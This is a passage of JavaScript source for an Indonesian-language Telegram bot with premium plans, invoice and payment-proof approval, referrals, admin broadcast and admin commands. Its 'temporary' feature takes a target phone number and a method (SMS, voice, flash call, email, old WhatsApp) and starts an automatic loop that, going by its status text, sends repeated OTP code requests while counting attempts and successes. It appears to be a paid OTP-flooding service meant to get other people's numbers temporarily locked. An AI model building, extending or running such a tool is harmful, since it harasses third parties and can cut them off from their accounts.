    "</blockquote>"
  ].join("\n"), buildTempStartKeyboard(method));
});

bot.action(/^temp_start_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
  const userId = ctx.from.id;
  const method = String(ctx.match[1] || "sms").toLowerCase();
  const phone = pendingSendPhone.get(userId);
  await safeAnswerCb(ctx, "ᴍᴇᴍᴜʟᴀɪ...");
  if (!phone) {
    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴛᴇᴍᴘᴏʀᴀʀʏ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
  }
  pendingSendMethod.set(userId, method);
  try {
    await editInline(ctx, buildTempStatusText({
      phone,
      method,
      lastStatus: "ᴍᴇᴍᴜʟᴀɪ",
      attempt: 0,
      successCount: 0,
      footer: [
        "ⓘ ᴍᴇɴɢɪʀɪᴍ ᴘᴇʀᴍɪɴᴛᴀᴀɴ ᴋᴏᴅᴇ ᴏᴛᴘ...",
        "ⓘ ᴛᴇᴋᴀɴ <b>⏹ ꜱᴛᴏᴘ</b> ᴜɴᴛᴜᴋ ʙᴇʀʜᴇɴᴛɪ."
      ]
    }), buildTempStopKeyboard());
  } catch (_) {}
  return runAutoSendLoop(ctx, phone, method);
});

bot.action("temp_back_methods", async (ctx) => {
  const userId = ctx.from.id;
  const phone = pendingSendPhone.get(userId);
  await safeAnswerCb(ctx);
  if (!phone) {
    return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
  }
  const probe = { methods: {}, isDeviceOn: false };
  return editInline(ctx, [
    "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ",
    "",
    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
    "▸ ᴘɪʟɪʜ ᴍᴇᴛᴏᴅᴇ ᴋɪʀɪᴍ ᴏᴛᴘ</blockquote>",
    "",
    "ⓘ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴍᴇᴛᴏᴅᴇ, ʟᴀʟᴜ ᴛᴇᴋᴀɴ ▶ ᴍᴜʟᴀɪ."
  ].join("\n"), buildSendMethodKeyboard(phone, probe));
});

bot.action("cancel_send", async (ctx) => {
  const userId = ctx.from.id;
  const job = activeSendJobs.get(userId);
  const phone = pendingSendPhone.get(userId);
  const method = pendingSendMethod.get(userId) || "sms";
  if (job) {
    job.cancelled = true;
    if (job.abort) {
      try { job.abort.abort(); } catch (_) {}
    }
    activeSendJobs.delete(userId);
  }
  awaitingSendInput.delete(userId);
  try { await safeAnswerCb(ctx, "⏹ ᴅɪʜᴇɴᴛɪᴋᴀɴ"); } catch (_) {}
  try {
    await editInline(ctx, [
      "✧ ᴛᴇᴍᴘᴏʀᴀʀʏ ᴅɪʜᴇɴᴛɪᴋᴀɴ",
      "",
      `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone || "-")}</code>`,
      `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}</blockquote>`,
      "",
      "ⓘ ᴘʀᴏꜱᴇꜱ ʟᴀɴɢꜱᴜɴɢ ᴅɪʜᴇɴᴛɪᴋᴀɴ."
    ].join("\n"), phone
      ? buildSendMethodKeyboard(phone, { methods: {}, isDeviceOn: false })
      : inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
  } catch (_) {}
  pendingSendPhone.delete(userId);
  pendingSendMethod.delete(userId);
  if (!job) {
    try { await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false); } catch (_) {}
  }
});


bot.action("nav_home", async (ctx) => {
  const userId = ctx.from.id;
  await safeAnswerCb(ctx);
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  awaitingSendInput.delete(userId);
  try {
    await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
  } catch (_) {
    try {
      await editInline(ctx, await buildDashboard(userId, ctx.from), inlineKb([]));
    } catch (__) {}
  }
});
bot.action("referral", async (ctx) => {
  const userId = ctx.from.id;
  await safeAnswerCb(ctx);
  await editInline(ctx, await buildReferralPage(userId), buildReferralKeyboard(userId));
});

bot.action("rewards", async (ctx) => {
  const userId = ctx.from.id;
  await safeAnswerCb(ctx);
  const ref = await getReferralStats(userId);
  await editInline(ctx, await buildRewardsPage(userId), buildRewardsKeyboard(ref.points));
});

bot.action(/^redeem_(\d+)$/, async (ctx) => {
  const userId = ctx.from.id;
  const i = parseInt(ctx.match[1], 10);
  const r = REWARDS[i];
  if (!r) return safeAnswerCb(ctx, "ᴘᴀᴋᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ");
  const u = await getUser(userId);
  if (((u && u.referral_points) || 0) < r.pts) {
    return safeAnswerCb(ctx, `ᴘᴏɪɴ ᴋᴜʀᴀɴɢ (${(u && u.referral_points) || 0}/${r.pts})`, { show_alert: true });
  }
  await redis.hincrby(`user:${userId}`, "referral_points", -r.pts);
  await redis.hincrby(`user:${userId}`, "referral_redeemed_days", r.days);
  await redis.zincrby("leaderboard:referrals", -r.pts, String(userId));
  const end = await addPremiumDays(userId, r.days);
  await safeAnswerCb(ctx, "✓ ʙᴇʀʜᴀꜱɪʟ");
  await editInline(ctx, [
    "✦ ᴘᴇɴᴜᴋᴀʀᴀɴ ʙᴇʀʜᴀꜱɪʟ",
    "",
    `<blockquote>⊹ ᴘᴏɪɴ ᴅɪɢᴜɴᴀᴋᴀɴ ⦂ ${r.pts} ᴘᴛ`,
    `⊹ ᴘʀᴇᴍɪᴜᴍ ᴅɪᴛᴀᴍʙᴀʜ ⦂ ${r.days} ʜᴀʀɪ`,
    `⊹ ʙᴇʀᴀᴋʜɪʀ ⦂ ${formatWIB(end.toISOString())}</blockquote>`
  ].join("\n"), inlineKb([[btn("⟢ ᴋᴇᴍʙᴀʟɪ", "referral", "primary")]]));
});

bot.action("premium_back", async (ctx) => {
  await safeAnswerCb(ctx);
  await editInline(ctx, buildPremiumPage(), buildPremiumKeyboard());
});

bot.action(/^buy_(p\d+)$/, async (ctx) => {
  const plan = PLANS.find(p => p.id === ctx.match[1]);
  if (!plan) return safeAnswerCb(ctx, "ᴘᴀᴋᴇᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ");
  const userId = ctx.from.id;
  const pending = await redis.smembers("payments:pending");
  for (const pid of pending) {
    const p = parseRedisHash(await redis.hgetall(`payment:${pid}`));
    if (p && Number(p.user_id) === userId && p.status === "pending") {
      await redis.hset(`payment:${pid}`, { status: "cancelled" });
      await redis.srem("payments:pending", pid);
    }
  }
  const nextId = Number(await redis.incr("payment:next_id"));
  const inv = "INV" + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2, 6).toUpperCase();
  await redis.hset(`payment:${nextId}`, {
    id: String(nextId),
    user_id: String(userId),
    plan_days: String(plan.days),
    plan_price: String(plan.price),
    invoice_id: inv,
    status: "pending",
    proof_file_id: "",
    created_at: new Date().toISOString(),
    approved_at: ""
  });
  await redis.set(`payment:invoice:${inv}`, String(nextId));
  await redis.sadd("payments:pending", String(nextId));
  await safeAnswerCb(ctx);
  const text = await buildPaymentInvoice(userId, plan, inv);
  await editInline(ctx, text, inlineKb([
    [
      btn("⟢ ɢᴀɴᴛɪ ᴘᴀᴋᴇᴛ", "premium_back", "primary"),
      btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", `cancel_inv_${nextId}`, "danger")
    ]
  ]));
});

bot.action(/^cancel_inv_(\d+)$/, async (ctx) => {
  const pid = ctx.match[1];
  const p = parseRedisHash(await redis.hgetall(`payment:${pid}`));
  if (!p || Number(p.user_id) !== ctx.from.id) return safeAnswerCb(ctx, "ᴛᴀɢɪʜᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ");
  if (p.status !== "pending") return safeAnswerCb(ctx, "ᴛᴀɢɪʜᴀɴ ꜱᴜᴅᴀʜ ᴅɪᴘʀᴏꜱᴇꜱ");
  await redis.hset(`payment:${pid}`, { status: "cancelled" });
  await redis.srem("payments:pending", pid);
  await safeAnswerCb(ctx, "ᴛᴀɢɪʜᴀɴ ᴅɪʙᴀᴛᴀʟᴋᴀɴ");
  await editInline(ctx, buildPremiumPage(), buildPremiumKeyboard());
});

bot.action("admin", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  adminState.delete(userId);
  await safeAnswerCb(ctx);
  await editInline(ctx, await buildAdminPanel(userId), buildAdminKeyboard());
});

bot.action("adm_close", async (ctx) => {
  const userId = ctx.from.id;
  adminState.delete(userId);
  await safeAnswerCb(ctx, "ᴅɪᴛᴜᴛᴜᴘ");
  await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
});

bot.action("adm_cancel", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  adminState.delete(userId);
  await safeAnswerCb(ctx, "ᴅɪʙᴀᴛᴀʟᴋᴀɴ");
  await editInline(ctx, await buildAdminPanel(userId), buildAdminKeyboard());
});

bot.action("adm_bc", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  await safeAnswerCb(ctx);
  adminState.set(userId, { action: "bc" });
  await editInline(ctx, [
    "⌲ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴘᴇꜱᴀɴ",
    "",
    "<blockquote>⟡ ᴋɪʀɪᴍ ᴘᴇꜱᴀɴ ᴛᴇᴋꜱ ᴀᴛᴀᴜ ꜰᴏᴛᴏ ᴅᴇɴɢᴀɴ ᴄᴀᴘᴛɪᴏɴ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪʙʀᴏᴀᴅᴄᴀꜱᴛ ᴋᴇ ꜱᴇʟᴜʀᴜʜ ᴘᴇɴɢɢᴜɴᴀ ʙᴏᴛ.</blockquote>"
  ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "adm_cancel", "danger")]]));
});

bot.action("adm_addprem", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  await safeAnswerCb(ctx);
  adminState.set(userId, { action: "addprem" });
  await editInline(ctx, [
    "✦ ᴛᴀᴍʙᴀʜ ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ",
    "",
    "<blockquote>⟡ ᴋɪʀɪᴍ ᴜꜱᴇʀ ɪᴅ ᴅᴀɴ ᴊᴜᴍʟᴀʜ ʜᴀʀɪ ᴅᴇɴɢᴀɴ ꜰᴏʀᴍᴀᴛ ⦂",
    "<code>8062935882 7</code></blockquote>"
  ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "adm_cancel", "danger")]]));
});

bot.action("adm_delprem", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  await safeAnswerCb(ctx);
  adminState.set(userId, { action: "delprem" });
  await editInline(ctx, [
    "✕ ʜᴀᴘᴜꜱ ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ",
    "",
    "<blockquote>⟡ ᴋɪʀɪᴍ ᴜꜱᴇʀ ɪᴅ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪᴋᴇᴍʙᴀʟɪᴋᴀɴ ᴋᴇ ꜰʀᴇᴇ ⦂",
    "<code>8062935882</code></blockquote>"
  ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "adm_cancel", "danger")]]));
});

bot.action("adm_premlist", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  adminState.delete(userId);
  await safeAnswerCb(ctx);
  const allIds = await getAllUserIds();
  const now = Date.now();
  const premUsers = [];
  for (const uid of allIds) {
    const u = await getUser(Number(uid));
    if (u && u.premium_until && new Date(u.premium_until).getTime() > now) {
      premUsers.push(u);
    }
  }
  const listLines = premUsers.length === 0
    ? ["⟡ ʙᴇʟᴜᴍ ᴀᴅᴀ ᴜꜱᴇʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴋᴛɪꜰ"]
    : premUsers.slice(0, 25).map(u => `⟢ <code>${u.user_id}</code> · ${esc(u.first_name || "-")} ⦂ ${formatWIB(u.premium_until)}`);
  await editInline(ctx, [
    "♛ ᴅᴀꜰᴛᴀʀ ᴜꜱᴇʀ ᴘʀᴇᴍɪᴜᴍ",
    "",
    `<blockquote>${listLines.join("\n")}</blockquote>`
  ].join("\n"), inlineKb([[btn("⟢ ᴋᴇᴍʙᴀʟɪ", "admin", "primary")]]));
});

bot.action("adm_setpay", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  await safeAnswerCb(ctx);
  adminState.set(userId, { action: "setpay" });
  const current = await getSetting("payment_info", process.env.PAYMENT_INFO || "-");
  await editInline(ctx, [
    "⊹ ᴀᴛᴜʀ ɪɴꜰᴏ ᴘᴇᴍʙᴀʏᴀʀᴀɴ",
    "",
    `<blockquote>ɪɴꜰᴏ ꜱᴀᴀᴛ ɪɴɪ ⦂\n${esc(current)}</blockquote>`,
    "",
    "ᴋɪʀɪᴍ ᴛᴇᴋꜱ ɪɴꜱᴛʀᴜᴋꜱɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʏᴀɴɢ ʙᴀʀᴜ."
  ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "adm_cancel", "danger")]]));
});

bot.action("adm_setcontact", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  await safeAnswerCb(ctx);
  adminState.set(userId, { action: "setcontact" });
  const current = await getSetting("admin_contact", process.env.ADMIN_CONTACT || "@admin");
  await editInline(ctx, [
    "⊹ ᴀᴛᴜʀ ᴋᴏɴᴛᴀᴋ ᴀᴅᴍɪɴ",
    "",
    `<blockquote>ᴋᴏɴᴛᴀᴋ ꜱᴀᴀᴛ ɪɴɪ ⦂ ${esc(current)}</blockquote>`,
    "",
    "ᴋɪʀɪᴍ @ᴜꜱᴇʀɴᴀᴍᴇ ᴀᴅᴍɪɴ ʏᴀɴɢ ʙᴀʀᴜ."
  ].join("\n"), inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "adm_cancel", "danger")]]));
});

bot.action("adm_pay", async (ctx) => {
  const userId = ctx.from.id;
  if (!ADMIN_IDS.includes(userId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  adminState.delete(userId);
  await safeAnswerCb(ctx);
  const ids = await redis.smembers("payments:pending");
  const rows = [];
  for (const pid of ids) {
    const p = parseRedisHash(await redis.hgetall(`payment:${pid}`));
    if (p && (p.status === "pending" || p.status === "review")) rows.push(p);
  }
  if (rows.length === 0) {
    return editInline(ctx, [
      "⟡ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ",
      "",
      "<blockquote>⟡ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ ꜱᴀᴀᴛ ɪɴɪ.</blockquote>"
    ].join("\n"), inlineKb([[btn("⟢ ᴋᴇᴍʙᴀʟɪ", "admin", "primary")]]));
  }
  const itemLines = [];
  const btnRows = [];
  for (const p of rows) {
    itemLines.push(`⟢ <code>${esc(p.invoice_id)}</code>`);
    itemLines.push(`  ᴜꜱᴇʀ ⦂ <code>${esc(p.user_id)}</code> · ${p.plan_days}ʜ · ${formatRp(p.plan_price)}`);
    itemLines.push(`  ꜱᴛᴀᴛᴜꜱ ⦂ ${esc(p.status)}`);
    btnRows.push([
      btn(`✓ ${p.invoice_id}`, `apv_${p.id}`, "success"),
      btn(`✕ ${p.invoice_id}`, `rjt_${p.id}`, "danger")
    ]);
  }
  btnRows.push([btn("⟢ ᴋᴇᴍʙᴀʟɪ", "admin", "primary")]);
  await editInline(ctx, [
    "⟡ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ",
    "",
    `<blockquote>${itemLines.join("\n")}</blockquote>`
  ].join("\n"), inlineKb(btnRows));
});

bot.action(/^apv_(\d+)$/, async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const id = parseInt(ctx.match[1], 10);
  const p = parseRedisHash(await redis.hgetall(`payment:${id}`));
  if (!p || (p.status !== "pending" && p.status !== "review")) return safeAnswerCb(ctx, "ᴛᴀɢɪʜᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ");
  await redis.hset(`payment:${id}`, { status: "approved", approved_at: new Date().toISOString() });
  await redis.srem("payments:pending", String(id));
  const targetUid = Number(p.user_id);
  const end = await addPremiumDays(targetUid, Number(p.plan_days));
  await safeAnswerCb(ctx, "✓ ᴅɪꜱᴇᴛᴜᴊᴜɪ");
  try {
    await ctx.telegram.sendMessage(targetUid, [
      "✦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴅɪꜱᴇᴛᴜᴊᴜɪ",
      "",
      `<blockquote>⊹ ɪɴᴠᴏɪᴄᴇ ⦂ <code>${esc(p.invoice_id)}</code>`,
      `⊹ ᴘᴀᴋᴇᴛ ⦂ ${p.plan_days} ʜᴀʀɪ`,
      `⊹ ʙᴇʀᴀᴋʜɪʀ ⦂ ${formatWIB(end.toISOString())}</blockquote>`
    ].join("\n"), { parse_mode: "HTML", ...mainKeyboard(targetUid) });
  } catch (_) {}
  if (ctx.callbackQuery && ctx.callbackQuery.message && ctx.callbackQuery.message.photo) {
    try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (_) {}
  } else {
    try { await editInline(ctx, await buildAdminPanel(adminId), buildAdminKeyboard()); } catch (_) {}
  }
});

bot.action(/^rjt_(\d+)$/, async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return safeAnswerCb(ctx, "ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const id = parseInt(ctx.match[1], 10);
  const p = parseRedisHash(await redis.hgetall(`payment:${id}`));
  if (!p || (p.status !== "pending" && p.status !== "review")) return safeAnswerCb(ctx, "ᴛᴀɢɪʜᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ");
  await redis.hset(`payment:${id}`, { status: "rejected" });
  await redis.srem("payments:pending", String(id));
  const targetUid = Number(p.user_id);
  await safeAnswerCb(ctx, "✕ ᴅɪᴛᴏʟᴀᴋ");
  try {
    await ctx.telegram.sendMessage(targetUid, [
      "✕ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴅɪᴛᴏʟᴀᴋ",
      "",
      `<blockquote>⊹ ɪɴᴠᴏɪᴄᴇ ⦂ <code>${esc(p.invoice_id)}</code></blockquote>`,
      "",
      "⟢ ʜᴜʙᴜɴɢɪ ᴀᴅᴍɪɴ ᴜɴᴛᴜᴋ ɪɴꜰᴏ ʟᴇʙɪʜ ʟᴀɴᴊᴜᴛ"
    ].join("\n"), { parse_mode: "HTML", ...mainKeyboard(targetUid) });
  } catch (_) {}
  if (ctx.callbackQuery && ctx.callbackQuery.message && ctx.callbackQuery.message.photo) {
    try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (_) {}
  } else {
    try { await editInline(ctx, await buildAdminPanel(adminId), buildAdminKeyboard()); } catch (_) {}
  }
});

bot.command("detect", async (ctx) => {
  const userId = ctx.from.id;
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (args) return processNumbers(ctx, args);
  awaitingInput.add(userId);
  await showInlinePanel(
    ctx,
    await buildDetectPrompt(userId, ctx.from),
    inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_detect", "danger")]]),
    false
  );
});

bot.command("email", async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  adminState.delete(userId);
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (args) return processEmailFix(ctx, args);
  awaitingEmailInput.add(userId);
  await showInlinePanel(
    ctx,
    await buildEmailPrompt(userId, ctx.from),
    inlineKb([[btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_email", "danger")]]),
    false
  );
});

bot.command("cancel", async (ctx) => {
  const userId = ctx.from.id;
  awaitingInput.delete(userId);
  awaitingEmailInput.delete(userId);
  adminState.delete(userId);
  await sendFreshKeyboardPanel(ctx, await buildDashboard(userId, ctx.from));
});

bot.command("addpremium", async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return ctx.reply("⚠ ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const parts = ctx.message.text.split(/\s+/);
  const id = parseInt(parts[1], 10);
  const days = parseInt(parts[2] || "1", 10);
  if (!id || isNaN(days) || days <= 0) {
    return ctx.reply("⚠ ꜰᴏʀᴍᴀᴛ ⦂ <code>/addpremium 8062935882 7</code>", { parse_mode: "HTML", ...mainKeyboard(adminId) });
  }
  const end = await addPremiumDays(id, days);
  try {
    await ctx.telegram.sendMessage(id, [
      "✦ ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ ᴀᴋᴛɪꜰ",
      "",
      `<blockquote>⊹ ᴅᴜʀᴀꜱɪ ⦂ +${days} ʜᴀʀɪ`,
      `⊹ ʙᴇʀᴀᴋʜɪʀ ⦂ ${formatWIB(end.toISOString())}</blockquote>`
    ].join("\n"), { parse_mode: "HTML", ...mainKeyboard(id) });
  } catch (_) {}
  await ctx.reply(`✦ ᴜꜱᴇʀ <code>${id}</code> ᴘʀᴇᴍɪᴜᴍ +${days}ʜ · ʙᴇʀᴀᴋʜɪʀ ${formatWIB(end.toISOString())}`, {
    parse_mode: "HTML",
    ...mainKeyboard(adminId)
  });
});

bot.command("delpremium", async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return ctx.reply("⚠ ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const id = parseInt(ctx.message.text.split(/\s+/)[1], 10);
  if (!id) return ctx.reply("⚠ ꜰᴏʀᴍᴀᴛ ⦂ <code>/delpremium 8062935882</code>", { parse_mode: "HTML", ...mainKeyboard(adminId) });
  await removePremiumUser(id);
  await ctx.reply(`✦ ᴜꜱᴇʀ <code>${id}</code> ꜱᴇᴋᴀʀᴀɴɢ ꜰʀᴇᴇ`, {
    parse_mode: "HTML",
    ...mainKeyboard(adminId)
  });
});

bot.command("setpayment", async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return ctx.reply("⚠ ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const info = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!info) return ctx.reply("⚠ ꜰᴏʀᴍᴀᴛ ⦂ /setpayment <ᴛᴇᴋꜱ ɪɴꜱᴛʀᴜᴋꜱɪ>", mainKeyboard(adminId));
  await setSetting("payment_info", info);
  await ctx.reply("✦ ɪɴꜱᴛʀᴜᴋꜱɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ᴅɪᴘᴇʀʙᴀʀᴜɪ", mainKeyboard(adminId));
});

bot.command("setcontact", async (ctx) => {
  const adminId = ctx.from.id;
  if (!ADMIN_IDS.includes(adminId)) return ctx.reply("⚠ ᴀᴋꜱᴇꜱ ᴅɪᴛᴏʟᴀᴋ");
  const c = ctx.message.text.split(" ")[1];
  if (!c) return ctx.reply("⚠ ꜰᴏʀᴍᴀᴛ ⦂ /setcontact <@ᴜꜱᴇʀɴᴀᴍᴇ>", mainKeyboard(adminId));
  await setSetting("admin_contact", c);
  await ctx.reply("✦ ᴋᴏɴᴛᴀᴋ ᴀᴅᴍɪɴ ᴅɪᴘᴇʀʙᴀʀᴜɪ", mainKeyboard(adminId));
});

bot.on("photo", async (ctx) => {
  const userId = ctx.from.id;
  if (ADMIN_IDS.includes(userId) && adminState.has(userId)) {
    const st = adminState.get(userId);
    if (st.action === "bc") {
      adminState.delete(userId);
      return runBroadcast(ctx, ctx.message);
    }
  }
  const ids = await redis.smembers("payments:pending");
  let target = null;
  for (const pid of ids) {
    const p = parseRedisHash(await redis.hgetall(`payment:${pid}`));
    if (p && Number(p.user_id) === userId && p.status === "pending") { target = p; break; }
  }
  if (!target) {
    return ctx.reply("⚠ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴛᴀɢɪʜᴀɴ ᴘᴇɴᴅɪɴɢ\n⟢ ᴘɪʟɪʜ ᴘᴀᴋᴇᴛ ᴘʀᴇᴍɪᴜᴍ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ", mainKeyboard(userId));
  }
  const photo = ctx.message.photo[ctx.message.photo.length - 1];
  await redis.hset(`payment:${target.id}`, { status: "review", proof_file_id: photo.file_id });
  for (const adminId of ADMIN_IDS) {
    try {
      await ctx.telegram.sendPhoto(adminId, photo.file_id, {
        caption: [
          "✦ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ʙᴀʀᴜ",
          "",
          `<blockquote>⟡ ɪɴᴠᴏɪᴄᴇ ⦂ <code>${esc(target.invoice_id)}</code>`,
          `⊹ ᴜꜱᴇʀ ⦂ <code>${userId}</code>`,
          `⊹ ɴᴀᴍᴀ ⦂ ${esc([ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-")}`,
          `⊹ ᴜꜱᴇʀɴᴀᴍᴇ ⦂ ${ctx.from.username ? "@" + esc(ctx.from.username) : "-"}`,
          `⊹ ᴘᴀᴋᴇᴛ ⦂ ${target.plan_days} ʜᴀʀɪ`,
          `⊹ ʜᴀʀɢᴀ ⦂ ${formatRp(target.plan_price)}</blockquote>`
        ].join("\n"),
        parse_mode: "HTML",
        ...inlineKb([[
          btn("✓ ᴀᴘᴘʀᴏᴠᴇ", `apv_${target.id}`, "success"),
          btn("✕ ʀᴇᴊᴇᴄᴛ", `rjt_${target.id}`, "danger")
        ]])
      });
    } catch (_) {}
  }
  await clearInlinePanel(ctx, userId);
  await ctx.reply([
    "✦ ʙᴜᴋᴛɪ ᴅɪᴋɪʀɪᴍ",
    "",
    `<blockquote>⊹ ɪɴᴠᴏɪᴄᴇ ⦂ <code>${esc(target.invoice_id)}</code>`,
    "⟡ ᴍᴇɴᴜɴɢɢᴜ ᴋᴏɴꜰɪʀᴍᴀꜱɪ ᴀᴅᴍɪɴ</blockquote>"
  ].join("\n"), { parse_mode: "HTML", ...mainKeyboard(userId) });
});

bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const txt = (ctx.message.text || "").trim();
  if (txt.startsWith("/") || ALL_MENU_TEXTS.has(txt)) {
    awaitingInput.delete(userId);
    awaitingEmailInput.delete(userId);
    awaitingSendInput.delete(userId);
    adminState.delete(userId);
    return next();
  }

  if (ADMIN_IDS.includes(userId) && adminState.has(userId)) {
    const st = adminState.get(userId);
    adminState.delete(userId);
    const backKb = inlineKb([[btn("⟢ ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴘᴀɴᴇʟ", "admin", "primary")]]);

    if (st.action === "bc") {
      return runBroadcast(ctx, ctx.message);
    }

    if (st.action === "addprem") {
      const parts = txt.split(/\s+/);
      const targetId = parseInt(parts[0], 10);
      const days = parseInt(parts[1] || "1", 10);
      if (!targetId || isNaN(days) || days <= 0) {
        return showInlinePanel(ctx, "⚠ ꜰᴏʀᴍᴀᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴄᴏɴᴛᴏʜ ⦂ <code>8062935882 7</code>", backKb, false);
      }
      const end = await addPremiumDays(targetId, days);
      try {
        await ctx.telegram.sendMessage(targetId, [
          "✦ ᴀᴋꜱᴇꜱ ᴘʀᴇᴍɪᴜᴍ ᴀᴋᴛɪꜰ",
          "",
          `<blockquote>⊹ ᴅᴜʀᴀꜱɪ ⦂ +${days} ʜᴀʀɪ`,
          `⊹ ʙᴇʀᴀᴋʜɪʀ ⦂ ${formatWIB(end.toISOString())}</blockquote>`
        ].join("\n"), { parse_mode: "HTML", ...mainKeyboard(targetId) });
      } catch (_) {}
      return showInlinePanel(ctx, [
        "✦ ᴘʀᴇᴍɪᴜᴍ ᴅɪᴛᴀᴍʙᴀʜᴋᴀɴ",
        "",
        `<blockquote>▸ ᴜꜱᴇʀ ɪᴅ ⦂ <code>${targetId}</code>`,
